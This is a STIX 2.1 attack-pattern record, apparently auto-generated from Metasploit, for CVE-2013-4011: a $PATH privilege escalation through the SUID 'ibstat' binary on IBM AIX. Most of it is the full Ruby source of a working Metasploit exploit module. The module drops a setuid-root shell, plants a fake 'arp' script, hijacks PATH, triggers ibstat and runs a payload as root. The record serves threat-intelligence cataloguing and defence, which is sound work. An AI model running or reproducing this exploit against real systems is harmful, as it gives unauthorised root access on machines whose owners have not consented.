{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7155c7a9-def5-47ac-8ed4-a6a5b6b71ad1",
    "created": "2024-08-14T16:56:47.353443Z",
    "modified": "2024-08-14T16:56:47.353447Z",
    "name": "ibstat $PATH Privilege Escalation",
    "description": " This module exploits the trusted $PATH environment variable of the SUID binary \"ibstat\". ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/aix/local/ibstat_path.rb",
            "external_id": "ibstat_path.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4011"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ibstat $PATH Privilege Escalation',\n        'Description' => %q{\n          This module exploits the trusted $PATH environment variable of the SUID binary \"ibstat\".\n        },\n        'Author' => [\n          'Kristian Erik Hermansen', # original author\n          'Sagi Shahar <sagi.shahar[at]mwrinfosecurity.com>', # Metasploit module\n          'Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2013-4011'],\n          ['OSVDB', '95420'],\n          ['BID', '61287'],\n          ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827'],\n          ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756']\n        ],\n        'Platform' => %w[unix aix],\n        'Arch' => ARCH_CMD,\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'perl'\n          }\n        },\n        'SessionTypes' => %w[shell],\n        'Targets' => [\n          ['IBM AIX Version 6.1', {}],\n          ['IBM AIX Version 7.1', {}]\n        ],\n        'DefaultTarget' => 1,\n        'DisclosureDate' => '2013-09-24',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('IBSTAT_PATH', [true, 'Path to ibstat executable', '/usr/bin/ibstat'])\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def ibstat_path\n    datastore['IBSTAT_PATH']\n  end\n\n  def check\n    find_output = cmd_exec('find /usr/sbin/ -name ibstat -perm -u=s -user root 2>/dev/null')\n\n    return CheckCode::Safe(\"#{ibstat_path} is not set-uid root\") unless find_output.to_s.include?('ibstat')\n\n    CheckCode::Appears(\"#{ibstat_path} is set-uid root\")\n  end\n\n  def exploit\n    root_file = \"#{datastore['WritableDir']}/#{rand_text_alpha(8)}\"\n    arp_file = \"#{datastore['WritableDir']}/arp\"\n    c_file = %^#include <stdio.h>\n\nint main()\n{\n   setreuid(0,0);\n   setregid(0,0);\n   execve(\"/bin/sh\",NULL,NULL);\n   return 0;\n}\n^\n    arp = %(#!/bin/sh\n\nchown root #{root_file}\nchmod 4555 #{root_file}\n)\n\n    if gcc_installed?\n      print_status(\"Dropping file #{root_file}.c...\")\n      write_file(\"#{root_file}.c\", c_file)\n\n      print_status('Compiling source...')\n      cmd_exec(\"gcc -o #{root_file} #{root_file}.c\")\n      print_status('Compilation completed')\n\n      register_file_for_cleanup(\"#{root_file}.c\")\n    else\n      cmd_exec(\"cp /bin/sh #{root_file}\")\n    end\n\n    register_file_for_cleanup(root_file)\n\n    print_status('Writing custom arp file...')\n    write_file(arp_file, arp)\n    register_file_for_cleanup(arp_file)\n    cmd_exec(\"chmod 0555 #{arp_file}\")\n    print_status('Custom arp file written')\n\n    print_status('Updating $PATH environment variable...')\n    path_env = cmd_exec('echo $PATH')\n    cmd_exec(\"PATH=#{datastore['WritableDir']}:$PATH\")\n    cmd_exec('export PATH')\n\n    print_status('Finding interface name...')\n    iface = ''\n    cmd_exec('lsdev -Cc if').each_line do |line|\n      next unless line.match(/^[a-z]+[0-9]+\\s+Available/) && !line.match(/^lo[0-9]/)\n\n      iface = line.split(/\\s+/)[0]\n      print_status(\"Found interface #{iface}.\")\n      break\n    end\n\n    if iface == ''\n      iface = 'en0'\n      print_status('Found no interface, defaulting to en0.')\n    end\n\n    print_status('Triggering vulnerablity...')\n    cmd_exec(\"#{ibstat_path} -a -i #{iface} 2>/dev/null >/dev/null\")\n\n    # The $PATH variable must be restored before the payload is executed\n    # in cases where an euid root shell was gained\n    print_status('Restoring $PATH environment variable...')\n    cmd_exec(\"PATH=#{path_env}\")\n    cmd_exec('export PATH')\n\n    cmd_exec(root_file)\n    print_status('Checking root privileges...')\n\n    if is_root?\n      print_status('Executing payload...')\n      cmd_exec(payload.encoded)\n    end\n  end\n\n  def gcc_installed?\n    print_status('Checking if gcc exists...')\n    gcc_whereis_output = cmd_exec('whereis -b gcc')\n\n    if gcc_whereis_output.to_s.include?('/')\n      print_good('gcc found!')\n      return true\n    end\n\n    print_status('gcc not found. Using /bin/sh from local system')\n    false\n  end\n\n  def is_root?\n    id_output = cmd_exec('id')\n\n    if id_output.include?('euid=0(root)')\n      print_good('Got root! (euid)')\n      return true\n    end\n\n    if id_output.include?('uid=0(root)')\n      print_good('Got root!')\n      return true\n    end\n\n    print_error('Exploit failed')\n    false\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-24",
    "x_mitre_platforms": [
        "%w[unix aix]"
    ]
}